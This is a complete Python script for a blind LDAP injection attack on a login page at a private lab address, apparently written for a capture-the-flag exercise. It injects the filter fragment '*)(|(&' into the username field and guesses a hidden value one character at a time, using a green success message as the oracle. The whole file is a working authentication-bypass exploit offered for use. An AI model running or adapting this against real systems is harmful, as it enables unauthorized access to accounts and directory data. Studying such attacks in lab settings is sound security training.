import requests
from bs4 import BeautifulSoup
import string
import time

#URL target
url = 'http://10.10.133.251/blind.php'

#Define the characters to be used
characters = string.ascii_letters + string.digits + string.punctuation + ' '
# print('Characters to be used: ', characters)

successfulChar = ''
charsFound = True

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while charsFound:
    charsFound = False

    for char in characters:
        # Adjust data to target the password field
        data = {'username': f'{successfulChar}{char}*)(|(&', 'password': 'pwd)'}

        # send POST request
        response = requests.post(url, headers=headers, data=data)

        # Parse HTML content
        soup = BeautifulSoup(response.content, 'html.parser')
        # print(soup)

        # Adjust success criteria as needed, in this case we know the correct char will result in a GREEN p element
        paragraph = soup.find_all('p', style='color: green;')

        if paragraph:
            successfulChar += char
            charsFound = True
            print('Successful character found: ', {char})
            break

    if not charsFound:
        print('No char found')


print(f'Successful Payload: {successfulChar}')
        